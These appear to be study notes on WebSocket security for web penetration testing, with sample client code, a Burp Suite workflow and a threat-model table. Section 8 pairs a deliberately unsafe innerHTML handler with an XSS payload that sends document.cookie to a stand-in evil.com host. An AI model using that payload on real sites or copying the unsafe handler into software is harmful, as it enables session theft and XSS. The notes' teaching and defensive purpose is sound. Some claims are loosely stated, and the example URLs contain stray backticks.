# WebSocket Notes for Web Pentesting

---

## 1. What is a WebSocket?

A **WebSocket** is a communication protocol that enables **persistent, two-way (full-duplex)** communication between a client (usually a browser) and a server over a **single TCP connection**.

Unlike HTTP, where the connection closes after a request/response, **WebSockets stay open**, allowing **real-time communication**.

## 2. Use Cases for WebSockets

- Real-time chat applications
- Online games
- Stock tickers
- Live notifications
- Collaborative apps (e.g., Google Docs)

## 3. WebSocket URL Format

WebSocket URLs are **not normal browser URLs**.

| Protocol | Description                                        |
| -------- | -------------------------------------------------- |
| `ws://`  | Insecure WebSocket connection (like HTTP)          |
| `wss://` | Secure WebSocket connection using TLS (like HTTPS) |

**Example:**

```js
const socket = new WebSocket('wss://`example.com/socket');
```

## 4. WebSocket Components

| Part     | Value       | Description                                   |
| -------- | ----------- | --------------------------------------------- |
| Protocol | `wss://`    | WebSocket over TLS (encrypted)                |
| Domain   | example.com | Target domain                                 |
| Path     | /socket     | The endpoint where the WebSocket is connected |

## 5. Basic WebSocket Communication (Client-side)

```javascript
const socket = new WebSocket('wss://`example.com/socket');

socket.onopen = () => {
  console.log('Connected');
  socket.send('Hello Server');
};

socket.onmessage = event => {
  console.log('Message from server:', event.data);
};

socket.onerror = error => {
  console.error('WebSocket Error:', error);
};

socket.onclose = () => {
  console.log('Connection closed');
};
```

## 6. WebSocket vs HTTP

| Feature    | HTTP                           | WebSocket                      |
| ---------- | ------------------------------ | ------------------------------ |
| Connection | Request/response (stateless)   | Persistent (full-duplex)       |
| Real-time  | No                             | Yes                            |
| Latency    | Higher (reconnect per request) | Lower (single open connection) |
| Use Case   | Page loads, forms              | Chat, games, real-time feeds   |

## 7. WebSocket Security Considerations

- Use `wss://` for encryption (avoid `ws://` on production)

- WebSockets bypass CORS and CSRF protections

- Input validation and output encoding must be handled manually

- Use authentication, rate-limiting, and access control

- Log and monitor WebSocket traffic for anomalies

## 8. XSS via WebSocket

Vulnerability

If untrusted data from WebSocket is inserted into the DOM unsafely (e.g. via `innerHTML`), an attacker can execute JavaScript (XSS).
**Vulnerable Code:**

```javascript
socket.onmessage = event => {
  chatBox.innerHTML += `<p>${event.data}</p>`; // unsafe
};
```

**Attack Payload:**

```javascript
<script>document.location='https://evil.com?c='+document.cookie</script>
```

**Secure Version:**

```javascript
socket.onmessage = event => {
  const msg = document.createTextNode(event.data); // safe
  const p = document.createElement('p');
  p.appendChild(msg);
  chatBox.appendChild(p);
};
```

## 9. Testing WebSockets in Burp Suite

- Go to Proxy > HTTP History

- Find a request that initiates the WebSocket connection

- Right-click → "Send to Repeater" or "Do Intercept"

- Use WebSocket tab to view real-time messages

- Modify, drop, or replay WebSocket messages

- Look for:

  - Reflection of data

  - Lack of validation

  - Privilege escalation

  - Hidden admin commands

  - Injection points

## 10. Real-World WebSocket Attack Examples

### 1. XSS via WebSocket message

- Attacker sends <script>alert(1)</script> to a chat app

- If the app uses innerHTML to render messages → XSS

### 2. Sensitive Data Leak

- WebSocket messages may include session IDs, tokens, or PII

- Attacker intercepts or views these in Burp

### 3. Command Injection (server-side)

- If WebSocket messages are passed directly to shell commands or DB queries

## 11. Summary Table: WebSocket Threat Model

| Risk                    | Description                                       |
| ----------------------- | ------------------------------------------------- |
| XSS                     | Rendering untrusted messages into DOM unsafely    |
| Injection (SQL/Command) | Server trusts user input from WebSocket           |
| Info Disclosure         | Sensitive data in WS messages                     |
| Auth Bypass             | Weak session handling over persistent connections |
| Insecure Transport      | Using `ws://` instead of `wss://`                 |

## 12. Key Points to Remember

- WebSockets are powerful but easy to misuse.

- They do not have built-in protections like CSRF tokens or CORS.

- Always validate input on both client and server.

- Treat WebSocket traffic as untrusted, just like normal HTTP input.
